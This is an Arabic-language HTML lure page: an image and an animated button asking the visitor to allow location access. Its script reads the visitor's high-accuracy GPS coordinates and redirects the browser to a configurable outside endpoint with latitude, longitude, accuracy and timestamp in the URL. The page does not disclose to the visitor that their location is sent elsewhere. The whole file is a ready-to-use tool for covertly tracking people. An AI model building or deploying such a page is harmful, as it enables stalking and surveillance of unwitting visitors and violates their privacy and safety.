<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>يرجى السماح بالوصول إلى الموقع</title>
  <style>
    :root { color-scheme: light dark; }
    body {
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #000;
      color: #fff;
      font-family: "Segoe UI", system-ui, sans-serif;
      text-align: center;
    }
    img {
      max-width: 90%;
      height: auto;
      border-radius: 12px;
      margin-bottom: 2rem;
    }
    button {
      background: #007bff;
      color: white;
      font-size: 1.4rem;
      border: none;
      border-radius: 12px;
      padding: 1rem 2rem;
      cursor: pointer;
      animation: bounce 1.2s infinite ease-in-out;
      box-shadow: 0 0 20px rgba(0, 123, 255, 0.6);
      transition: transform 0.2s;
    }
    button:hover {
      transform: scale(1.05);
    }
    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% {
        transform: translateY(0);
      }
      40% {
        transform: translateY(-12px);
      }
      60% {
        transform: translateY(-6px);
      }
    }
  </style>
</head>
<body>
  <img src="490716617_24365319479735048_6862502247511119998_n.jpg" alt="صورة" />
  <button id="locButton">يرجى السماح بالوصول إلى الموقع</button>

  <script>
    const button = document.getElementById('locButton');
    const zielURL = "https://example.com/endpoint"; // <– anpassen

    button.addEventListener('click', () => {
      if (!('geolocation' in navigator)) {
        alert('المتصفح لا يدعم تحديد الموقع الجغرافي');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          const url = new URL(zielURL);
          url.searchParams.set('lat', latitude);
          url.searchParams.set('lng', longitude);
          url.searchParams.set('acc', accuracy);
          url.searchParams.set('ts', Date.now());
          window.location.href = url;
        },
        err => {
          alert('تعذر الحصول على الموقع: ' + err.message);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  </script>
</body>
</html>
